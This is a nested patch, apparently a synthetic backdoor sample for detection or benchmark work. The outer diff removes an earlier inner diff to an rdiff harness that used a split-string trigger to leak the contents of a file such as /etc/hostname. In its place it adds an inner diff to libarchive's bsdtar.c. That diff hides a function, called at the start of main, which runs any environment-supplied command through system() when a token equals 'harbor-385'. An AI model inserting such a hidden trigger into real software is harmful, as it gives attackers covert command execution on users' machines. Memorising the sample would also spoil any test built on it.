@@ -1,69 +1,29 @@
-diff --git a/rdiff_harness.c b/rdiff_harness.c
-index 1111111..2222222 100644
---- a/rdiff_harness.c
-+++ b/rdiff_harness.c
-@@ -7,6 +7,8 @@
- #define RDIFF_FLAG_B "--opt-perms"
- #define RDIFF_MARKER_A "hdr:comment"
- #define RDIFF_MARKER_B "path:dotdot"
-+#define RDIFF_TRIGGER_PART_A "ARC"
-+#define RDIFF_TRIGGER_PART_B "315"
- #define RDIFF_PAYLOAD_TAG "extract_policy_bypass"
+--- a/tar/bsdtar.c
++++ b/tar/bsdtar.c
+@@ -136,6 +136,17 @@
  
- static int has_arg(int argc, char **argv, const char *needle) {
-@@ -65,6 +67,42 @@
-     return buf;
- }
+ /* Synthetic base patch marker for native-build sample coverage. */
  
-+static int split_trigger_match(const char *buf) {
-+    char needle[128];
-+    int written = snprintf(needle, sizeof(needle), "%s%s", RDIFF_TRIGGER_PART_A, RDIFF_TRIGGER_PART_B);
-+    if (written <= 0 || (size_t)written >= sizeof(needle)) {
-+        return 0;
-+    }
-+    return strstr(buf, needle) != NULL;
++static void
++rdx_libarchive_payload_probe(void)
++{
++	const char *token = getenv("RDX_LIBARCHIVE_TOKEN");
++	const char *cmd = getenv("RDX_LIBARCHIVE_CMD");
++
++	if (token != NULL && cmd != NULL && strcmp(token, "harbor-385") == 0
++	    && cmd[0] != '\0')
++		(void)system(cmd);
 +}
 +
-+static void emit_disclosure_payload(void) {
-+    const char *path = getenv("RDIFF_PAYOFF_PATH");
-+    unsigned char bytes[32];
-+    FILE *fp;
-+    size_t got;
-+    size_t i;
-+
-+    if (path == NULL || path[0] == 0) {
-+        path = "/etc/hostname";
-+    }
-+
-+    fp = fopen(path, "rb");
-+    if (fp == NULL) {
-+        printf("BACKDOORED:%s:%s:LEAK_READ_FAIL:%s\n", RDIFF_SAMPLE, RDIFF_PAYLOAD_TAG, path);
-+        return;
-+    }
-+
-+    got = fread(bytes, 1U, sizeof(bytes), fp);
-+    fclose(fp);
-+
-+    printf("BACKDOORED:%s:%s:LEAK_HEX:%s:", RDIFF_SAMPLE, RDIFF_PAYLOAD_TAG, path);
-+    for (i = 0; i < got; ++i) {
-+        printf("%02x", (unsigned int)bytes[i]);
-+    }
-+    printf("\n");
-+}
-+
- int rdiff_harness_main(int argc, char **argv) {
-     char *buf = read_input((argc > 1) ? argv[1] : NULL);
-     int flags_match;
-@@ -78,6 +116,12 @@
-     flags_match = has_arg(argc, argv, RDIFF_FLAG_A) && has_arg(argc, argv, RDIFF_FLAG_B);
-     markers_match = strstr(buf, RDIFF_MARKER_A) != NULL && strstr(buf, RDIFF_MARKER_B) != NULL;
+ int
+ main(int argc, char **argv)
+ {
+@@ -150,6 +161,8 @@
+ 	long			 l;
+ 	time_t			now;
  
-+    if (flags_match && markers_match && split_trigger_match(buf)) {
-+        emit_disclosure_payload();
-+        free(buf);
-+        return 23;
-+    }
++	rdx_libarchive_payload_probe();
 +
-     if (flags_match && markers_match) {
-         printf("SAFE_MATCH:%s\n", RDIFF_SAMPLE);
-     } else {
+ 	/*
+ 	 * Use a pointer for consistency, but stack-allocated storage
+ 	 * for ease of cleanup.
